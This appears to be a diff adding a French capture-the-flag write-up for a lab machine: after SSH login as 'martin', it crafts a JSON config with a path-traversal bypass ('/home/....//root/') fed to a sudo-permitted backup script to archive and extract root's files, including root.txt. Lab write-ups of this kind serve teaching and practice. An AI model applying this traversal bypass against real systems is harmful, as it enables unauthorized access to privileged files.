@@ -84,3 +84,58 @@ SELECT * FROM user
 ![[user_table.png]]
 
 On constate qu'il y 2 utilisateurs avec leurs **user name** et des **mots de passe hashés**
+
+## ssh sur l'utilisateur martin
+
+```
+shh martin@10.10.11.62
+```
+
+![[ssh_martin.png]]
+
+On va essayer de savoir si **martin** a les droits **root** avec la commande `sudo -l`
+
+![[test_root.png]]
+
+**martin** n'a pas les droits **root** mais on constate qu'il y a un truc intéressant dans **/usr/bin/backy.sh*
+
+Avant d'aller chercher quelque chose dans ce script, on va créer un script **json** permettant à **martin** d'avoir les droits **root**
+```
+cat > ~/root-steal.json << EOF
+> {
+>   "destination": "/home/",
+>   "multiprocessing": true,
+>   "verbose_log": true,
+>   "directories_to_archive": [
+>     "/home/....//root/"
+>   ]
+> }
+> EOF
+
+```
+
+Une fois le fichier **.json** créer, on va l'exécuter en même temps que **backy.sh**
+```
+sudo /usr/bin/backy.sh /home/martin/root-steal.json
+```
+
+Voici le résultat:
+![[exec_backy.png]]
+
+l'exécution de **backy.sh** a aussi créer un fichier nommé `code_home_.._root_2025_June.tar.bz2` qui se trouve dans le répertoire **/home**
+
+![[code_home.png]]
+
+On va maintenant extraire ce fichier vers `/home/martin/root_dump`
+
+```
+tar -xvjf code_home_.._root_2025_June.tar.bz2 -C /home/martin/root_dump
+```
+
+Grâce à l'extraction de cette commande, un fichier **root.txt** est apparu dans le répertoire `/home/martin/root_dump/root`
+
+![[root_txt.png]]
+
+Et voila !!!!
+
+`
